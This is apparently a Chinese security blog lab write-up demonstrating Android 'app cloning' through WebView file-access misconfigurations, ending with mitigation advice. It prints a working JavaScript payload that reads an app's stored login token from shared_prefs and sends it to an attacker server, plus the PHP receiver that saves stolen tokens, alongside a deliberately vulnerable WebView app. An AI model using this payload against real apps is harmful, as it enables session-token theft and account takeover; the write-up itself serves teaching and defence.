@@ -1,0 +1,62 @@
+*本文原创作者：烟波渺渺正愁予，本文属FreeBuf原创奖励计划，未经许可禁止转载
+0×00前言
+在上一篇文章《WebView域控不严格读取内部私有文件实验》中，对webview跨域访问进行了简单的实验，后续决定深入挖掘一下APP克隆，之前文章中讲过的这里也将不再赘述。
+0×01实验环境
+基础环境：win10,Android studio 3,eclipse(androidserver 开发)，ubuntu12(hackserver)
+模拟器：
+要开发APP:AppClone，AttackAPP，StartClone
+1、Androidserver
+Login.jsp：根据用户名密码判断是哪个用户然后返回一个token给安卓端
+Myinfo.jsp：根据token判断是哪个用户，然后返回其个人信息。
+Code区域：以上代码比较简单，大家可以自行编写或在网上找一段改改，这里就不占地方了
+2、Hackserver
+Code区域：
+Receve.php主要用来接收APP传过来的token,并保存到newfile.txt中。
+<?php $data = $_GET["data"]; $myfile = fopen("/var/www/appclone/newfile.txt","w") or die("Unable to open file!"); fwrite($myfile, $data); fclose($myfile); ?>
+sendToken.htm用来读取shared_prefs下保存的token并发送token到hackserver。
+<html> <script> var token = ""; function iGetInnerText(testStr) { var resultStr = testStr.replace(/\ +/g, ""); //去掉空格 resultStr = testStr.replace(/[ ]/g, ""); //去掉空格 resultStr = testStr.replace(/[\r
+]/g, ""); //去掉回车换行 return resultStr; } function loadXMLDoc() { var arm ="file:///data/data//com.example.test0.appclone/shared_prefs/loginState.xml"; var xmlhttp; if (window.XMLHttpRequest) { xmlhttp=new XMLHttpRequest(); } xmlhttp.onreadystatechange=function() { if (xmlhttp.readyState==4) { token= iGetInnerText(xmlhttp.responseText); token= token.substr(token.length-34); token= token.substr(0,19); document.write(token); sendToken(); } } xmlhttp.open("GET",arm); xmlhttp.send(null); } function sendToken() { var arm = "http://www.hackserver.com/appclone/receive.php?data="+token; var xmlhttp2; if (window.XMLHttpRequest) { xmlhttp2=new XMLHttpRequest(); } xmlhttp2.onreadystatechange=function() { if (xmlhttp2.readyState==4) { //document.write(xmlhttp2.status); //document.write(arm); } } xmlhttp2.open("GET",arm); xmlhttp2.send(null); } loadXMLDoc(); </script> </html>
+3、AppClone
+被克隆的APP，mainactivity用于登录，successactivity显示登录成功后的个人页面。
+Code区域：
+mainactivity
+<?xml version="1.0"encoding="utf-8"?> <LinearLayoutxmlns:android="http://schemas.android.com/apk/res/android" xmlns:tools="http://schemas.android.com/tools" android:id="@+id/ll1" android:layout_width="fill_parent" android:layout_height="fill_parent" android:orientation="vertical" > <TextView android:text="用户名" android:layout_width="match_parent" android:layout_height="wrap_content"/> <EditText android:id="@+id/username" android:layout_width="match_parent" android:layout_height="wrap_content"/> <TextView android:text="密码" android:layout_width="match_parent" android:layout_height="wrap_content"/> <EditText android:id="@+id/password" android:layout_width="match_parent" android:layout_height="wrap_content"/> <Button android:id="@+id/button" android:layout_width="wrap_content" android:layout_height="wrap_content" android:text="登录"/> <ScrollView android:id="@+id/scrollView1" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_weight="1"> <LinearLayout android:id="@+id/ll2" android:layout_width="match_parent" android:layout_height="match_parent"> <TextView android:id="@+id/result" android:layout_width="match_parent" android:layout_height="wrap_content" android:layout_weight="1"/> </LinearLayout> </ScrollView> </LinearLayout> public class MainActivity extends Activity{ private EditText username; private EditText password; private Button button; private Handler handler; private String result=""; private TextView resultTV; public static final String Intent_key="token"; public static final String Intent_url="URL"; private SharedPreferences preferences; private String urlInfo ="http://www.androidserver.com:8080/ad/myinfo.jsp?token="; private SharedPreferences.Editor editor; @Override public void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); requestWindowFeature(Window.FEATURE_NO_TITLE); setContentView(R.layout.activity_main); //获取preferences和editor对象 preferences = getSharedPreferences("loginState",MODE_PRIVATE); editor = preferences.edit(); String token =preferences.getString("token","fail"); Intent intent = new Intent(this,SuccessActivity.class); Bundle bundle = new Bundle(); if(token.equals("user3_login_success")){ bundle.putString(Intent_key, token); bundle.putString(Intent_url, urlInfo + token); intent.putExtra("bundle", bundle); startActivityForResult(intent,0); }else if(token.equals("user4_login_success")){ bundle.putString(Intent_key, token); bundle.putString(Intent_url, urlInfo + token); intent.putExtra("bundle", bundle); startActivityForResult(intent,0); } username=(EditText)findViewById(R.id.username); password=(EditText)findViewById(R.id.password); resultTV=(TextView)findViewById(R.id.result); button=(Button)findViewById(R.id.button); button.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View arg0) { if("".equals(username.getText().toString())){ Toast.makeText(MainActivity.this, "请登录", Toast.LENGTH_SHORT).show(); return; } new Thread(new Runnable() { @Override public void run() { login(); Messagem=handler.obtainMessage(); handler.sendMessage(m); } }).start(); } }); handler=new Handler(){ @Override public void handleMessage(Message msg) { if(result!=null){ resultTV.setText(result); username.setText(""); password.setText(""); } super.handleMessage(msg); } }; } //当从secondActivity中返回时调用此函数,清空token @Override protected void onActivityResult(int requestCode, int resultCode, Intentdata) { super.onActivityResult(requestCode, resultCode, data); if(requestCode==0 && resultCode==RESULT_OK){ Bundle bundle = data.getExtras(); String text =null; if(bundle!=null) text=bundle.getString("return"); Log.d("text",text); editor.remove("token"); editor.commit(); } } public void login() { String target="http://www.androidserver.com:8080/ad/login.jsp"; URL url; try { url=new URL(target); HttpURLConnection urlConn=(HttpURLConnection)url.openConnection(); urlConn.setRequestMethod("POST"); urlConn.setDoInput(true); urlConn.setDoOutput(true); urlConn.setUseCaches(false); urlConn.setInstanceFollowRedirects(true); urlConn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded"); DataOutputStream out=new DataOutputStream(urlConn.getOutputStream()); String param="username="+URLEncoder.encode(username.getText().toString(),"utf-8") +"&password="+URLEncoder.encode(password.getText().toString(),"utf-8"); System.out.println(username); out.writeBytes(param); out.flush(); out.close(); if(urlConn.getResponseCode()==HttpURLConnection.HTTP_OK){ InputStreamReader in=newInputStreamReader(urlConn.getInputStream()); BufferedReader buffer=newBufferedReader(in); String inputLine=null; String token = ""; result = ""; while((inputLine=buffer.readLine())!=null){ result+=inputLine; } in.close(); Intent intent = newIntent(this,SuccessActivity.class); Bundle bundle = new Bundle(); if(result.indexOf("user3_login_success")!=-1){ token ="user3_login_success"; }elseif(result.indexOf("user4_login_success")!=-1){ token ="user4_login_success"; }else{ return; } editor.putString("token",token); bundle.putString(Intent_key,token); bundle.putString(Intent_url,urlInfo + token); editor.commit(); intent.putExtra("bundle", bundle); startActivityForResult(intent,0); } urlConn.disconnect(); } catch (MalformedURLException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } } }
+successactivity
+<?xml version="1.0"encoding="utf-8"?> <LinearLayoutxmlns:android="http://schemas.android.com/apk/res/android" android:orientation="vertical" android:layout_width="match_parent" android:layout_height="match_parent"> <TextView android:id="@+id/textView" android:layout_width="fill_parent" android:layout_height="50dp" /> <Button android:id="@+id/button" android:layout_width="wrap_content" android:layout_height="wrap_content" android:hint="点击按钮返回" /> <WebView android:layout_width="match_parent" android:layout_height="match_parent" android:id="@+id/webView" /> </LinearLayout> public class SuccessActivity extendsAppCompatActivity { private Button button=null; private TextView textView =null; private WebView webView; private String url = ""; private String text = ""; private class ButtonListener implements OnClickListener { @Override public void onClick(View v) { switch (v.getId()){ case R.id.button: Intent intent =getIntent(); Bundle bundle =newBundle(); bundle.putString("return","return fromSuccessActivity!"); intent.putExtras(bundle); setResult(RESULT_OK,intent); finish(); break; } } } public void initView(){ button= (Button) findViewById(R.id.button); textView= (TextView) findViewById(R.id.textView); button.setOnClickListener( new ButtonListener() ); textView.setText(text); } @Override protected void onCreate(Bundle savedInstanceState) { super.onCreate(savedInstanceState); setContentView(R.layout.activity_success); webView = findViewById(R.id.webView); webView.getSettings().setAllowFileAccess(true); webView.setWebViewClient(new WebViewClient() { public void onPageFinished(WebView view, String url) { } }); WebSettings webSettings = webView.getSettings(); webSettings.setJavaScriptEnabled(true); //webView.getSettings().setAllowFileAccessFromFileURLs(true); //webView.getSettings().setAllowUniversalAccessFromFileURLs(true); Intent intent =getIntent(); Bundle bundle = intent.getBundleExtra("bundle"); String token = bundle.getString(MainActivity.Intent_key); if(token.equals("user3_login_success")){ text ="张三登录成功"; }else if(token.equals("user4_login_success")){ text ="李四登录成功"; } url = bundle.getString(MainActivity.Intent_url); initView(); webView.loadUrl(url); } }
+4、AttackAPP
+Httpdownloader负责下载文件，Fileutil负责写文件,整个APP的功能是从hack.com上下载的sendToken.htm保存到/sdcard/Download/目录下，下载完成然后在调起被克隆的APP，让被克隆的APP加载sendToken.htm，从而把token发送到hackserver服务器上。
+Code区域：以上代码比较占地方，网上也很多，大家可以自己下一些改改就可以了。
+5、StartClone
+此APP就一个mainactivity，功能是从hackserver获取newfile.txt中保存的token，然后带着token从外部调起APPClone,从而实现克隆。
+Code区域：以上代码大家可以网上搜搜自己改改就可以了。
+0×02 实验内容
+克隆基本思路
+User3手机
+1、 当启动AppClone时，先判断shared_pfres下有没有用户登录的token，如果有则直接进行successactivity，如果没有则在mainactivity中输入用户名密码进行登录，登录成功保存token。这里使用zhangsan登录。
+2、 启动attackapp，主要功能是下载hackserver上sendToken.htm并保存到/sdcard/Download/目录下，等下载完成，对appclone发起外部调用，让successactivity加载/sdcard/Download/sendToken.htm把token传输到hackserver上，hackserver收到token后保存到newfile.txt中。
+User4手机
+1、 启动AppClone并使用lisi账号登录。
+2、 启动startclone，startclone会请求newfile.txt里的token值，然后使用这个token从外部调起APPClone，直接让successactivity接收到的token为zhangsan的token,进而登录张三的个人信息页，从而实现克隆。
+0×03 实验步骤
+1、启动两个虚拟机:
+user3是被克隆的手机，装有两个app（AppClone，准备被克隆的APP，AttackAPP，发起攻击的APP）
+user4是用来克隆的手机，装有两个app（AppClone，准备被克隆的APP，StartClone，开始克隆）
+2、启动user3上的Appclone，并使用zhangsan登录，登录成功后会进入个人信息页面
+3、启动user4上的Appclone，并使用lisi登录，登录成功可以看到张三和李四的个人信息页面里的钱是不一样的。
+4、在user3上启动AttackAPP ，这里hackserver上的newfile中是没有数据的
+点击开始攻击后数据被上传到hackserver，点击查看文件内容，可以看到被写入的token
+5、运行startClone后，可以看到user4的手机也变成了张三的登录状态，克隆成功。
+0×04 修改代码
+1、如果不开启setJavaScriptEnabled,那么sendToken.htm将无法执行其中的js代码，也就无法将token发送到hackserver上。
+2、本来看文章说是在js中访问file:///要开启setAllowFileAccessFromFileURLs(true)，但是实验下来不需要也可以。
+3、如果把setAllowUniversalAccessFromFileURLs(true)也注释掉则token传输失败，也就是说不开启它则无法把数据传输给远程服务器。
+0×05 实验中遇到的问题及解决思路
+1、 sd卡写入权限问题，一开始使用的虚拟机是安卓8.0在AndroidManifest申请好权限，但是无论如何也写入不成功，后来一查发现安卓6.0后需要在代码中动态申请权限，经过尝试之后发现很程度很容易崩溃，一定是我不懂开发的原因，转而换成安卓5.1的虚拟机，直接在AndroidManifest申请权限就可以了。 2、 未开启js访问，无论如何token都不能发送成功，然后把js删除发现htm确实被加载了，想到很有可能是这个原因，于是补上了webSettings.setJavaScriptEnabled(true);问题解决了。 3、 网络访问(下载)需要异步请求，不然程序也会出问题。
+0×06 修复建议
+通过实验发现做到以下几点，都可以防范：
+1、webview不开启webSettings.setJavaScriptEnabled(true);
+2、webview不开启setAllowUniversalAccessFromFileURLs(true)
+还有之前文章中提到的：
+1、 设置activity不可被导出
+2、 禁止WebView 使用 File 协议，而且是明确禁止
+*本文原创作者：烟波渺渺正愁予，本文属FreeBuf原创奖励计划，未经许可禁止转载
